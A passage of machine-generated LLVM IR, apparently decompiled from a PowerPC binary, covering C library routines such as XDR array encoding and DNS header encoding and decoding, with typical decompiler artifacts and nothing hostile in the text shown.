  uselistorder i32* @r9, { 18, 38, 41, 49, 39, 40, 36, 19, 37, 42, 0, 77, 59, 60, 14, 50, 51, 52, 3, 12, 61, 69, 70, 1, 43, 20, 21, 15, 16, 17, 71, 22, 24, 23, 4, 72, 73, 8, 75, 62, 63, 9, 10, 64, 11, 25, 5, 6, 26, 27, 28, 29, 30, 31, 13, 44, 45, 46, 47, 48, 55, 58, 2, 76, 65, 66, 7, 67, 68, 56, 57, 32, 33, 53, 54, 74, 34, 35 }
  uselistorder i32 400, { 3, 4, 8, 9, 0, 6, 7, 1, 2, 5 }
  uselistorder i32* @r7, { 7, 17, 18, 19, 5, 6, 15, 16, 8, 9, 10, 0, 1, 2, 3, 11, 13, 12, 14, 4 }
  uselistorder i32* @r6, { 10, 29, 8, 9, 27, 11, 28, 30, 31, 32, 17, 33, 34, 35, 36, 20, 19, 21, 12, 13, 0, 1, 2, 3, 4, 5, 37, 38, 39, 23, 25, 15, 16, 18, 22, 26, 24, 14, 6, 7 }
  uselistorder i32 (i32)* @__get_myaddress, { 1, 0 }
  uselistorder label %dec_label_pc_10027940, { 2, 1, 0 }
}

define i32 @_rpc_dtablesize() local_unnamed_addr {
entry:
  %v0_1002795c = load i32, i32* @r31, align 4
  %v3_10027968 = load i32, i32* @global_var_100452b4.1417, align 4
  %v3_1002796c = icmp eq i32 %v3_10027968, 0
  br i1 %v3_1002796c, label %dec_label_pc_10027974, label %dec_label_pc_1002797c

dec_label_pc_10027974:                            ; preds = %entry
  store i32 268597624, i32* @lr, align 4
  %v0_10027974 = call i32 @getdtablesize()
  store i32 %v0_10027974, i32* @global_var_100452b4.1417, align 4
  br label %dec_label_pc_1002797c

dec_label_pc_1002797c:                            ; preds = %entry, %dec_label_pc_10027974
  %v3_10027980 = phi i32 [ %v3_10027968, %entry ], [ %v0_10027974, %dec_label_pc_10027974 ]
  store i32 %v0_1002795c, i32* @r31, align 4
  ret i32 %v3_10027980

; uselistorder directives
  uselistorder i32 ()* @getdtablesize, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1002797c, { 1, 0 }
}

define i32 @xdr_vector(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r27.global-to-local, align 4
  store i32 %arg4, i32* %r28.global-to-local, align 4
  store i32 %arg5, i32* %r29.global-to-local, align 4
  %v2_100279d49 = icmp eq i32 %arg3, 0
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v2_100279e411 = add i32 %arg2, %arg4
  store i32 %v2_100279e411, i32* %r31.global-to-local, align 4
  store i32 1, i32* %r30.global-to-local, align 4
  br i1 %v2_100279d49, label %dec_label_pc_100279f0, label %dec_label_pc_100279c0

dec_label_pc_100279c0:                            ; preds = %entry, %dec_label_pc_100279c0.dec_label_pc_100279d4_crit_edge.dec_label_pc_100279c0_crit_edge
  %v0_100279c0 = phi i32 [ %v0_100279c0.pre, %dec_label_pc_100279c0.dec_label_pc_100279d4_crit_edge.dec_label_pc_100279c0_crit_edge ], [ %arg5, %entry ]
  call void @__pseudo_call(i32 %v0_100279c0)
  %v0_100279cc = load i32, i32* %r3.global-to-local, align 4
  %v3_100279cc = icmp eq i32 %v0_100279cc, 0
  br i1 %v3_100279cc, label %dec_label_pc_100279f4, label %dec_label_pc_100279c0.dec_label_pc_100279d4_crit_edge

dec_label_pc_100279c0.dec_label_pc_100279d4_crit_edge: ; preds = %dec_label_pc_100279c0
  %v0_100279d4.pre = load i32, i32* %r30.global-to-local, align 4
  %v1_100279d4.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_100279d8.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_100279dc.pre = load i32, i32* %r26.global-to-local, align 4
  %v1_100279e4.pre = load i32, i32* %r28.global-to-local, align 4
  %v2_100279d4 = icmp ult i32 %v0_100279d4.pre, %v1_100279d4.pre
  store i32 %v0_100279dc.pre, i32* %r3.global-to-local, align 4
  %v2_100279e4 = add i32 %v0_100279d8.pre, %v1_100279e4.pre
  store i32 %v2_100279e4, i32* %r31.global-to-local, align 4
  %v1_100279e8 = add i32 %v0_100279d4.pre, 1
  store i32 %v1_100279e8, i32* %r30.global-to-local, align 4
  br i1 %v2_100279d4, label %dec_label_pc_100279c0.dec_label_pc_100279d4_crit_edge.dec_label_pc_100279c0_crit_edge, label %dec_label_pc_100279f0

dec_label_pc_100279c0.dec_label_pc_100279d4_crit_edge.dec_label_pc_100279c0_crit_edge: ; preds = %dec_label_pc_100279c0.dec_label_pc_100279d4_crit_edge
  %v0_100279c0.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100279c0

dec_label_pc_100279f0:                            ; preds = %entry, %dec_label_pc_100279c0.dec_label_pc_100279d4_crit_edge
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100279f4

dec_label_pc_100279f4:                            ; preds = %dec_label_pc_100279c0, %dec_label_pc_100279f0
  %v0_10027a04 = phi i32 [ 1, %dec_label_pc_100279f0 ], [ 0, %dec_label_pc_100279c0 ]
  ret i32 %v0_10027a04

; uselistorder directives
  uselistorder i32 %v0_100279d4.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_100279f4, { 1, 0 }
  uselistorder label %dec_label_pc_100279f0, { 1, 0 }
  uselistorder label %dec_label_pc_100279c0, { 1, 0 }
}

define i32 @__GI_xdr_array(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg6, i32* @r8, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r28, align 4
  store i32 %arg5, i32* %r25.global-to-local, align 4
  store i32 %arg6, i32* %r24.global-to-local, align 4
  store i32 %tmp, i32* @r27, align 4
  %v1_10027a34 = inttoptr i32 %arg2 to i32*
  %v2_10027a34 = load i32, i32* %v1_10027a34, align 4
  store i32 %v2_10027a34, i32* @r31, align 4
  store i32 268597820, i32* @lr, align 4
  %v2_10027a38 = inttoptr i32 %arg3 to i32*
  %v4_10027a38 = call i32 @xdr_u_int(i32* %v2_10027a38, i32* %v2_10027a38)
  store i32 %v4_10027a38, i32* %r3.global-to-local, align 4
  %v3_10027a3c = icmp eq i32 %v4_10027a38, 0
  br i1 %v3_10027a3c, label %dec_label_pc_10027b34, label %dec_label_pc_10027a44

dec_label_pc_10027a44:                            ; preds = %entry
  %v0_10027a44 = load i32, i32* %r30.global-to-local, align 4
  %v1_10027a44 = inttoptr i32 %v0_10027a44 to i32*
  %v2_10027a44 = load i32, i32* %v1_10027a44, align 4
  store i32 %v2_10027a44, i32* @r29, align 4
  %v1_10027a48 = load i32, i32* @r28, align 4
  %v3_10027a48 = icmp ugt i32 %v2_10027a44, %v1_10027a48
  br i1 %v3_10027a48, label %dec_label_pc_10027a60, label %dec_label_pc_10027a50

dec_label_pc_10027a50:                            ; preds = %dec_label_pc_10027a44
  %v1_10027a54 = load i32, i32* %r25.global-to-local, align 4
  %v2_10027a54 = udiv i32 -1, %v1_10027a54
  %v3_10027a58 = icmp ugt i32 %v2_10027a44, %v2_10027a54
  br i1 %v3_10027a58, label %dec_label_pc_10027a60, label %dec_label_pc_10027a6c

dec_label_pc_10027a60:                            ; preds = %dec_label_pc_10027a50, %dec_label_pc_10027a44
  %v0_10027a60 = load i32, i32* @r27, align 4
  %v1_10027a60 = inttoptr i32 %v0_10027a60 to i32*
  %v2_10027a60 = load i32, i32* %v1_10027a60, align 4
  %v3_10027a64 = icmp eq i32 %v2_10027a60, 2
  br i1 %v3_10027a64, label %dec_label_pc_10027a6c, label %dec_label_pc_10027b34

dec_label_pc_10027a6c:                            ; preds = %dec_label_pc_10027a60, %dec_label_pc_10027a50
  %v0_10027a6c = load i32, i32* @r31, align 4
  %v3_10027a6c = icmp eq i32 %v0_10027a6c, 0
  br i1 %v3_10027a6c, label %dec_label_pc_10027a74, label %dec_label_pc_10027ad4

dec_label_pc_10027a74:                            ; preds = %dec_label_pc_10027a6c
  %v0_10027a74 = load i32, i32* @r27, align 4
  %v1_10027a74 = inttoptr i32 %v0_10027a74 to i32*
  %v2_10027a74 = load i32, i32* %v1_10027a74, align 4
  %v3_10027a78 = icmp eq i32 %v2_10027a74, 1
  br i1 %v3_10027a78, label %dec_label_pc_10027a8c, label %dec_label_pc_10027a80

dec_label_pc_10027a80:                            ; preds = %dec_label_pc_10027a74
  %v3_10027a80 = icmp eq i32 %v2_10027a74, 2
  br i1 %v3_10027a80, label %dec_label_pc_10027b3c, label %dec_label_pc_10027ad4

dec_label_pc_10027a8c:                            ; preds = %dec_label_pc_10027a74
  %v3_10027a8c = icmp eq i32 %v2_10027a44, 0
  br i1 %v3_10027a8c, label %dec_label_pc_10027b3c, label %dec_label_pc_10027a94

dec_label_pc_10027a94:                            ; preds = %dec_label_pc_10027a8c
  %v1_10027a94 = load i32, i32* %r25.global-to-local, align 4
  %v2_10027a94 = mul i32 %v1_10027a94, %v2_10027a44
  store i32 %v2_10027a94, i32* @r30, align 4
  store i32 %v2_10027a94, i32* @r3, align 4
  store i32 268597920, i32* @lr, align 4
  %v0_10027a9c = call i32 @malloc()
  store i32 %v0_10027a9c, i32* @r3, align 4
  %v3_10027aa0 = icmp eq i32 %v0_10027a9c, 0
  store i32 %v0_10027a9c, i32* @r31, align 4
  %v1_10027aa8 = load i32, i32* @r26, align 4
  %v2_10027aa8 = inttoptr i32 %v1_10027aa8 to i32*
  store i32 %v0_10027a9c, i32* %v2_10027aa8, align 4
  br i1 %v3_10027aa0, label %dec_label_pc_10027ab0, label %dec_label_pc_10027ac8

dec_label_pc_10027ab0:                            ; preds = %dec_label_pc_10027a94
  %v3_10027ab8 = load i32, i32* @global_var_1004513c, align 4
  store i32 ptrtoint ([26 x i8]* @global_var_1002fc2c.1418 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10027ac4.1419 to i32), i32* @lr, align 4
  %v4_10027ac0 = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_1002fc2c.1418 to i32), i32 %v3_10027ab8, i32 268697600)
  store i32 %v4_10027ac0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10027b34

dec_label_pc_10027ac8:                            ; preds = %dec_label_pc_10027a94
  %v0_10027ac8 = load i32, i32* @r30, align 4
  store i32 %v0_10027ac8, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 268597972, i32* @lr, align 4
  %v0_10027ad0 = call i32 @__GI_memset()
  store i32 %v0_10027ad0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10027ad4

dec_label_pc_10027ad4:                            ; preds = %dec_label_pc_10027a80, %dec_label_pc_10027a6c, %dec_label_pc_10027ac8
  br label %dec_label_pc_10027af0

dec_label_pc_10027ae0:                            ; preds = %dec_label_pc_10027af0
  %v0_10027ae0 = load i32, i32* %r24.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_10027ae0)
  %v0_10027aec = load i32, i32* %r3.global-to-local, align 4
  %v0_10027af0.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10027af0

dec_label_pc_10027af0:                            ; preds = %dec_label_pc_10027ad4, %dec_label_pc_10027ae0
  %v0_10027b08 = phi i32 [ 0, %dec_label_pc_10027ad4 ], [ %v0_10027af0.pre, %dec_label_pc_10027ae0 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10027ad4 ], [ %v0_10027aec, %dec_label_pc_10027ae0 ]
  store i32 %storemerge, i32* @r30, align 4
  %v1_10027af0 = load i32, i32* @r29, align 4
  %v0_10027af4 = load i32, i32* @r31, align 4
  %v0_10027af8 = load i32, i32* @r27, align 4
  store i32 %v0_10027af8, i32* %r3.global-to-local, align 4
  %v3_10027b00 = icmp eq i32 %storemerge, 0
  %v1_10027b04 = load i32, i32* %r25.global-to-local, align 4
  %v2_10027b04 = add i32 %v1_10027b04, %v0_10027af4
  store i32 %v2_10027b04, i32* @r31, align 4
  %v1_10027b08 = add i32 %v0_10027b08, 1
  store i32 %v1_10027b08, i32* @r28, align 4
  %.not = icmp uge i32 %v0_10027b08, %v1_10027af0
  %brmerge = or i1 %v3_10027b00, %.not
  br i1 %brmerge, label %dec_label_pc_10027b14, label %dec_label_pc_10027ae0

dec_label_pc_10027b14:                            ; preds = %dec_label_pc_10027af0
  %v1_10027b14 = inttoptr i32 %v0_10027af8 to i32*
  %v2_10027b14 = load i32, i32* %v1_10027b14, align 4
  %v3_10027b18 = icmp eq i32 %v2_10027b14, 2
  br i1 %v3_10027b18, label %dec_label_pc_10027b20, label %dec_label_pc_10027b40

dec_label_pc_10027b20:                            ; preds = %dec_label_pc_10027b14
  %v0_10027b20 = load i32, i32* @r26, align 4
  %v1_10027b20 = inttoptr i32 %v0_10027b20 to i32*
  %v2_10027b20 = load i32, i32* %v1_10027b20, align 4
  store i32 %v2_10027b20, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10027b28.1420 to i32), i32* @lr, align 4
  %v0_10027b24 = call i32 @free()
  store i32 %v0_10027b24, i32* %r3.global-to-local, align 4
  %v1_10027b2c = load i32, i32* @r26, align 4
  %v2_10027b2c = inttoptr i32 %v1_10027b2c to i32*
  store i32 0, i32* %v2_10027b2c, align 4
  %v0_10027b44.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10027b40

dec_label_pc_10027b34:                            ; preds = %dec_label_pc_10027a60, %entry, %dec_label_pc_10027ab0
  store i32 0, i32* @r30, align 4
  br label %dec_label_pc_10027b40

dec_label_pc_10027b3c:                            ; preds = %dec_label_pc_10027a80, %dec_label_pc_10027a8c
  store i32 1, i32* @r30, align 4
  br label %dec_label_pc_10027b40

dec_label_pc_10027b40:                            ; preds = %dec_label_pc_10027b14, %dec_label_pc_10027b34, %dec_label_pc_10027b20, %dec_label_pc_10027b3c
  %v0_10027b44 = phi i32 [ %storemerge, %dec_label_pc_10027b14 ], [ 0, %dec_label_pc_10027b34 ], [ %v0_10027b44.pre, %dec_label_pc_10027b20 ], [ 1, %dec_label_pc_10027b3c ]
  store i32 %v0_10027b44, i32* %r3.global-to-local, align 4
  ret i32 %v0_10027b44

; uselistorder directives
  uselistorder i32 %v0_10027b44, { 1, 0 }
  uselistorder i32 %v0_10027a9c, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7 }
  uselistorder i32 ()* @__GI_memset, { 85, 7, 3, 9, 8, 6, 1, 4, 80, 31, 84, 83, 82, 81, 10, 29, 89, 88, 87, 86, 2, 0, 92, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 91, 90, 51, 50, 49, 48, 14, 13, 12, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 30, 28, 27, 5, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 11 }
  uselistorder i32 (i32*, i32*)* @xdr_u_int, { 4, 3, 2, 0, 1, 5 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10027b40, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10027b3c, { 1, 0 }
  uselistorder label %dec_label_pc_10027b34, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10027af0, { 1, 0 }
  uselistorder label %dec_label_pc_10027ad4, { 2, 0, 1 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* %r7.global-to-local, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_10027c3c, label %dec_label_pc_10027b64

dec_label_pc_10027b64:                            ; preds = %entry
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_10027b64 = add i32 %tmp, 2
  %v2_10027b64 = inttoptr i32 %v1_10027b64 to i8*
  %v3_10027b64 = load i8, i8* %v2_10027b64, align 1
  %v4_10027b64 = zext i8 %v3_10027b64 to i32
  store i32 %v4_10027b64, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r7.global-to-local, align 4
  store i8 %v3_10027b64, i8* %tmp3, align 1
  %v2_10027b70 = load i32, i32* %arg1, align 4
  store i32 %v2_10027b70, i32* %r0.global-to-local, align 4
  %v1_10027b74 = trunc i32 %v2_10027b70 to i8
  %v4_10027b74 = add i32 %arg2, 1
  %v5_10027b74 = inttoptr i32 %v4_10027b74 to i8*
  store i8 %v1_10027b74, i8* %v5_10027b74, align 1
  %v1_10027b78 = add i32 %tmp, 12
  %v2_10027b78 = inttoptr i32 %v1_10027b78 to i32*
  %v3_10027b78 = load i32, i32* %v2_10027b78, align 4
  store i32 %v3_10027b78, i32* %r0.global-to-local, align 4
  %v1_10027b7c = add i32 %tmp, 16
  %v2_10027b7c = inttoptr i32 %v1_10027b7c to i32*
  %v3_10027b7c = load i32, i32* %v2_10027b7c, align 4
  store i32 %v3_10027b7c, i32* %r11.global-to-local, align 4
  %v1_10027b80 = add i32 %tmp, 4
  %v2_10027b80 = inttoptr i32 %v1_10027b80 to i32*
  %v3_10027b80 = load i32, i32* %v2_10027b80, align 4
  %v2_10027b84 = icmp ne i32 %v3_10027b78, 0
  %v5_10027b88 = zext i1 %v2_10027b84 to i32
  store i32 %v5_10027b88, i32* %r10.global-to-local, align 4
  %v1_10027b8c = add i32 %tmp, 8
  %v2_10027b8c = inttoptr i32 %v1_10027b8c to i32*
  %v3_10027b8c = load i32, i32* %v2_10027b8c, align 4
  %v2_10027b90 = icmp ne i32 %v3_10027b7c, 0
  %v5_10027b94 = zext i1 %v2_10027b90 to i32
  %v1_10027b98 = add i32 %tmp, 20
  %v2_10027b98 = inttoptr i32 %v1_10027b98 to i32*
  %v3_10027b98 = load i32, i32* %v2_10027b98, align 4
  store i32 %v3_10027b98, i32* %r0.global-to-local, align 4
  %not.v2_10027b9c = icmp eq i32 %v3_10027b80, 0
  %v6_10027ba0 = sext i1 %not.v2_10027b9c to i32
  store i32 %v5_10027b94, i32* %r11.global-to-local, align 4
  %v1_10027ba8 = call i32 @__asm_rlwinm(i32 %v6_10027ba0, i32 0, i32 24, i32 24)
  %v0_10027bac = load i32, i32* %r10.global-to-local, align 4
  %v1_10027bac = mul i32 %v0_10027bac, 4
  store i32 %v1_10027bac, i32* %r10.global-to-local, align 4
  %v1_10027bb0 = call i32 @__asm_rlwinm(i32 %v3_10027b8c, i32 3, i32 25, i32 28)
  store i32 %v1_10027bb0, i32* @r8, align 4
  %v0_10027bb4 = load i32, i32* %r0.global-to-local, align 4
  %v2_10027bb4 = icmp ne i32 %v0_10027bb4, 0
  %v5_10027bb8 = zext i1 %v2_10027bb4 to i32
  %v2_10027bbc = or i32 %v1_10027bac, %v1_10027bb0
  store i32 %v2_10027bbc, i32* @r10, align 4
  %v1_10027bc0 = add i32 %v1_10027ba8, 128
  %v0_10027bc4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10027bc4 = mul i32 %v0_10027bc4, 2
  store i32 %v1_10027bc4, i32* %r11.global-to-local, align 4
  %v2_10027bc8 = or i32 %v2_10027bbc, %v5_10027bb8
  store i32 %v2_10027bc8, i32* %r0.global-to-local, align 4
  %v2_10027bcc = or i32 %v2_10027bc8, %v1_10027bc0
  %v2_10027bd0 = or i32 %v2_10027bcc, %v1_10027bc4
  %v1_10027bd4 = trunc i32 %v2_10027bd0 to i8
  %v4_10027bd4 = add i32 %arg2, 2
  %v5_10027bd4 = inttoptr i32 %v4_10027bd4 to i8*
  store i8 %v1_10027bd4, i8* %v5_10027bd4, align 1
  %v1_10027bd8 = add i32 %tmp, 24
  %v2_10027bd8 = inttoptr i32 %v1_10027bd8 to i32*
  %v3_10027bd8 = load i32, i32* %v2_10027bd8, align 4
  %v1_10027bdc = add i32 %tmp, 28
  %v2_10027bdc = inttoptr i32 %v1_10027bdc to i32*
  %v3_10027bdc = load i32, i32* %v2_10027bdc, align 4
  store i32 %v3_10027bdc, i32* %r0.global-to-local, align 4
  %not.v2_10027be0 = icmp eq i32 %v3_10027bd8, 0
  %v6_10027be4 = sext i1 %not.v2_10027be0 to i32
  %v1_10027be8 = call i32 @__asm_rlwinm(i32 %v6_10027be4, i32 0, i32 24, i32 24)
  %v1_10027bec = urem i32 %v3_10027bdc, 16
  store i32 %v1_10027bec, i32* %r0.global-to-local, align 4
  %v1_10027bf0 = add i32 %v1_10027be8, 128
  %v2_10027bf4 = or i32 %v1_10027bec, %v1_10027bf0
  %v1_10027bf8 = trunc i32 %v2_10027bf4 to i8
  %v4_10027bf8 = add i32 %arg2, 3
  %v5_10027bf8 = inttoptr i32 %v4_10027bf8 to i8*
  store i8 %v1_10027bf8, i8* %v5_10027bf8, align 1
  %v1_10027bfc = add i32 %tmp, 34
  %v2_10027bfc = inttoptr i32 %v1_10027bfc to i8*
  %v3_10027bfc = load i8, i8* %v2_10027bfc, align 1
  %v4_10027bfc = zext i8 %v3_10027bfc to i32
  store i32 %v4_10027bfc, i32* %r0.global-to-local, align 4
  %v4_10027c00 = add i32 %arg2, 4
  %v5_10027c00 = inttoptr i32 %v4_10027c00 to i8*
  store i8 %v3_10027bfc, i8* %v5_10027c00, align 1
  %v1_10027c04 = add i32 %tmp, 32
  %v2_10027c04 = inttoptr i32 %v1_10027c04 to i32*
  %v3_10027c04 = load i32, i32* %v2_10027c04, align 4
  store i32 %v3_10027c04, i32* %r0.global-to-local, align 4
  %v1_10027c08 = trunc i32 %v3_10027c04 to i8
  %v4_10027c08 = add i32 %arg2, 5
  %v5_10027c08 = inttoptr i32 %v4_10027c08 to i8*
  store i8 %v1_10027c08, i8* %v5_10027c08, align 1
  %v1_10027c0c = add i32 %tmp, 38
  %v2_10027c0c = inttoptr i32 %v1_10027c0c to i8*
  %v3_10027c0c = load i8, i8* %v2_10027c0c, align 1
  %v4_10027c0c = zext i8 %v3_10027c0c to i32
  store i32 %v4_10027c0c, i32* %r0.global-to-local, align 4
  %v4_10027c10 = add i32 %arg2, 6
  %v5_10027c10 = inttoptr i32 %v4_10027c10 to i8*
  store i8 %v3_10027c0c, i8* %v5_10027c10, align 1
  %v1_10027c14 = add i32 %tmp, 36
  %v2_10027c14 = inttoptr i32 %v1_10027c14 to i32*
  %v3_10027c14 = load i32, i32* %v2_10027c14, align 4
  store i32 %v3_10027c14, i32* %r0.global-to-local, align 4
  %v1_10027c18 = trunc i32 %v3_10027c14 to i8
  %v4_10027c18 = add i32 %arg2, 7
  %v5_10027c18 = inttoptr i32 %v4_10027c18 to i8*
  store i8 %v1_10027c18, i8* %v5_10027c18, align 1
  %v1_10027c1c = add i32 %tmp, 42
  %v2_10027c1c = inttoptr i32 %v1_10027c1c to i8*
  %v3_10027c1c = load i8, i8* %v2_10027c1c, align 1
  %v4_10027c1c = zext i8 %v3_10027c1c to i32
  store i32 %v4_10027c1c, i32* %r0.global-to-local, align 4
  %v4_10027c20 = add i32 %arg2, 8
  %v5_10027c20 = inttoptr i32 %v4_10027c20 to i8*
  store i8 %v3_10027c1c, i8* %v5_10027c20, align 1
  %v1_10027c24 = add i32 %tmp, 40
  %v2_10027c24 = inttoptr i32 %v1_10027c24 to i32*
  %v3_10027c24 = load i32, i32* %v2_10027c24, align 4
  store i32 %v3_10027c24, i32* %r0.global-to-local, align 4
  %v1_10027c28 = trunc i32 %v3_10027c24 to i8
  %v4_10027c28 = add i32 %arg2, 9
  %v5_10027c28 = inttoptr i32 %v4_10027c28 to i8*
  store i8 %v1_10027c28, i8* %v5_10027c28, align 1
  %v1_10027c2c = add i32 %tmp, 46
  %v2_10027c2c = inttoptr i32 %v1_10027c2c to i8*
  %v3_10027c2c = load i8, i8* %v2_10027c2c, align 1
  %v4_10027c2c = zext i8 %v3_10027c2c to i32
  store i32 %v4_10027c2c, i32* %r0.global-to-local, align 4
  %v4_10027c30 = add i32 %arg2, 10
  %v5_10027c30 = inttoptr i32 %v4_10027c30 to i8*
  store i8 %v3_10027c2c, i8* %v5_10027c30, align 1
  %v1_10027c34 = add i32 %tmp, 44
  %v2_10027c34 = inttoptr i32 %v1_10027c34 to i32*
  %v3_10027c34 = load i32, i32* %v2_10027c34, align 4
  store i32 %v3_10027c34, i32* %r0.global-to-local, align 4
  %v1_10027c38 = trunc i32 %v3_10027c34 to i8
  %v4_10027c38 = add i32 %arg2, 11
  %v5_10027c38 = inttoptr i32 %v4_10027c38 to i8*
  store i8 %v1_10027c38, i8* %v5_10027c38, align 1
  %v0_10027c3c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10027c3c

dec_label_pc_10027c3c:                            ; preds = %entry, %dec_label_pc_10027b64
  %v0_10027c3c = phi i32 [ -1, %entry ], [ %v0_10027c3c.pre, %dec_label_pc_10027b64 ]
  ret i32 %v0_10027c3c

; uselistorder directives
  uselistorder i32 %v1_10027bec, { 1, 0 }
  uselistorder i32 %v1_10027bc4, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 2, 13, 6, 9, 8, 12, 11, 10, 1, 3, 5, 4, 7 }
  uselistorder i32 38, { 10, 2, 5, 11, 6, 7, 8, 9, 0, 1, 3, 4 }
  uselistorder i32 128, { 0, 1, 7, 6, 33, 22, 39, 40, 43, 5, 35, 37, 52, 53, 31, 44, 41, 45, 46, 47, 23, 48, 49, 50, 2, 32, 51, 36, 42, 34, 29, 30, 3, 38, 4, 8, 10, 9, 24, 11, 13, 12, 25, 14, 16, 15, 26, 18, 17, 27, 19, 21, 20, 28 }
  uselistorder label %dec_label_pc_10027c3c, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10027c44 = load i8, i8* %arg1, align 1
  %v4_10027c44 = zext i8 %v3_10027c44 to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_10027c4c = add i32 %tmp, 1
  %v3_10027c4c = inttoptr i32 %v2_10027c4c to i8*
  %v4_10027c4c = load i8, i8* %v3_10027c4c, align 1
  %v5_10027c4c = zext i8 %v4_10027c4c to i32
  %v1_10027c54 = mul nuw nsw i32 %v4_10027c44, 256
  %v2_10027c58 = or i32 %v5_10027c4c, %v1_10027c54
  %v2_10027c5c = inttoptr i32 %arg2 to i32*
  store i32 %v2_10027c58, i32* %v2_10027c5c, align 4
  %v0_10027c60 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027c60 = add i32 %v0_10027c60, 2
  %v2_10027c60 = inttoptr i32 %v1_10027c60 to i8*
  %v3_10027c60 = load i8, i8* %v2_10027c60, align 1
  %v4_10027c60 = zext i8 %v3_10027c60 to i32
  %v1_10027c64 = call i32 @__asm_rlwinm(i32 %v4_10027c60, i32 25, i32 31, i32 31)
  %v2_10027c68 = add i32 %arg2, 4
  %v3_10027c68 = inttoptr i32 %v2_10027c68 to i32*
  store i32 %v1_10027c64, i32* %v3_10027c68, align 4
  %v0_10027c6c = load i32, i32* %r9.global-to-local, align 4
  %v1_10027c6c = add i32 %v0_10027c6c, 2
  %v2_10027c6c = inttoptr i32 %v1_10027c6c to i8*
  %v3_10027c6c = load i8, i8* %v2_10027c6c, align 1
  %v4_10027c6c = zext i8 %v3_10027c6c to i32
  %v1_10027c70 = call i32 @__asm_rlwinm(i32 %v4_10027c6c, i32 29, i32 28, i32 31)
  %v2_10027c74 = add i32 %arg2, 8
  %v3_10027c74 = inttoptr i32 %v2_10027c74 to i32*
  store i32 %v1_10027c70, i32* %v3_10027c74, align 4
  %v0_10027c78 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027c78 = add i32 %v0_10027c78, 2
  %v2_10027c78 = inttoptr i32 %v1_10027c78 to i8*
  %v3_10027c78 = load i8, i8* %v2_10027c78, align 1
  %v4_10027c78 = zext i8 %v3_10027c78 to i32
  %v1_10027c7c = call i32 @__asm_rlwinm(i32 %v4_10027c78, i32 30, i32 31, i32 31)
  %v2_10027c80 = add i32 %arg2, 12
  %v3_10027c80 = inttoptr i32 %v2_10027c80 to i32*
  store i32 %v1_10027c7c, i32* %v3_10027c80, align 4
  %v0_10027c84 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027c84 = add i32 %v0_10027c84, 2
  %v2_10027c84 = inttoptr i32 %v1_10027c84 to i8*
  %v3_10027c84 = load i8, i8* %v2_10027c84, align 1
  %v4_10027c84 = zext i8 %v3_10027c84 to i32
  %v1_10027c88 = call i32 @__asm_rlwinm(i32 %v4_10027c84, i32 31, i32 31, i32 31)
  %v2_10027c8c = add i32 %arg2, 16
  %v3_10027c8c = inttoptr i32 %v2_10027c8c to i32*
